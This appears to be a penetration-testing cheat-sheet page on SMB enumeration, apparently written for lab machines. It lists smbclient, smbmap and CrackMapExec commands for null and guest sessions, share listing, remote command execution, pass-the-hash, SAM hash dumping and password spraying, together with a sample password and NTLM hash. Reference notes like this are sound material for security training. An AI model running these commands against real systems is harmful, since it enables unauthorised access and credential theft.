---
layout: default
title: SMB
parent: ENUMERATION
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[CME](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/)

## Smbclient
```csharp
// Testing for null sessions
smbclient -L \\10.10.10.175 -U %
smbclient -L \\10.10.10.175 -N
smbclient -L \\egotistical-bank.local -I 10.10.10.175 -N

// Testing guest account
smbclient -L \\10.10.10.175 -U 'Guest' -N
smbclient -L \\10.10.10.175 -U 'Guest%'
smbclient -L \\10.10.10.175 -U 'Guest%Guest'

// With credentials
smbclient -L \\10.10.10.175 -U 'user%pass'
smbclient -L \\egostistical-bank.local -I 10.10.10.175 -U 'user%pass'
```

## Smbmap
```csharp
// Try a null session, should leak domain
smbmap -H 10.10.10.175 -u '' -p ''

// With credentials
smbmap -H 10.10.10.175 -u 'user' -p 'pass'
smbmap -H 10.10.10.175 -d egotistical-bank.local -u fsmith -p pass

// Recursive directory listing of share
smbmap -H 10.10.10.175 -d egotistical-bank.local -u fsmith -p pass -R IPC$

// Running a command
smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -x 'ipconfig'
smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -x 'ipconfig' --mode psexec
```

## CrackMapExec
`CrackMapExec` is part of `Empire`. If `Empire` is installed, `CME` can run `Empire` modules directly, such as `Mimikatz`. See [this link](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/) for examples.

```csharp
// Testing for null sessions
crackmapexec smb 10.10.10.175 -d egotistical-bank.local --shares
crackmapexec smb 10.10.10.175 -u '' -p '' -d egotistical-bank.local --shares

// With credentials list SMB shares
crackmapexec smb 10.10.10.175 -u 'user' -p 'pass' -d egotistical-bank.local --shares

// Using a hash instead of a password (pass-the-hash)
crackmapexec smb 10.10.10.175 -u administrator -H 'aad3g435b51404eeaadfb435b51404ee:d9485863c1e9e05811aa40cbc4ab9dff' -d egotistical-bank.local

// Running commands
crackmapexec smb 10.10.10.175 -u Administrator -H 'aad3g435b51404eeaadfb435b51404ee:d9485863c1e9e05811aa40cbc4ab9dff' -d egotistical-bank.local -x 'whoami' --exec-method smbexec

// Dumping SAM hashes
crackmapexec smb 10.10.10.175 -u Administrator -H 'aad3g435b51404eeaadfb435b51404ee:d9485863c1e9e05811aa40cbc4ab9dff' --local-auth --sam

// Password spraying (location of target IP is important)
crackmapexec smb 10.10.10.175 -u ./wordlists/known-users -p 'pass'
```